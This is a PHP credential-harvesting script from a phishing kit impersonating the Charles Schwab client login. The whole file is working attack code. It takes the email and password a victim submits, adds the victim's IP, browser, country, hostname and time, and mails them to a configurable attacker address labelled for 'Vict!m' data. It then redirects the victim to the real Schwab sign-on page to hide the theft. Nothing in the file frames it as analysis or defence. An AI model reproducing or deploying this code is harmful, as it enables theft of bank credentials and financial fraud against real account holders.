<?php

$ip = getenv("REMOTE_ADDR");
$addr_details = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='. $ip));
$country = stripslashes(ucfirst($addr_details[geoplugin_countryName]));
$timedate = date("D/M/d, Y g:i a"); 
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);

$message .= "===================| client.schwab.com Info |=====================\n";
$message .= "Email                   : ".$_POST['text1']."\n";
$message .= "Password                : ".$_POST['text2']."\n";
$message .= "=======================| Vict!m Info |============================\n";
$message .= "IP                     : ".$ip."\n";
$message .= "Browser                :".$browserAgent."\n";
$message .= "DateTime               : ".$timedate."\n";
$message .= "country                : ".$country."\n";
$message .= "HostName               : ".$hostname."\n";
$message .= "==========================| BURGER |===============================\n";

//change ur email here
$send = "localhost@gmail.com";
$subject = "Result from $ip";
$headers = "From: mail_owa@Spammers";
$headers .= $_POST['eMailAdd'] . "\n";
$headers .= "MIME-Version: 1.0\n";

mail($send,$subject,$message,$headers);

header("Location: https://client.schwab.com/Login/SignOn/CustomerCenterLogin.aspx");
		 
?>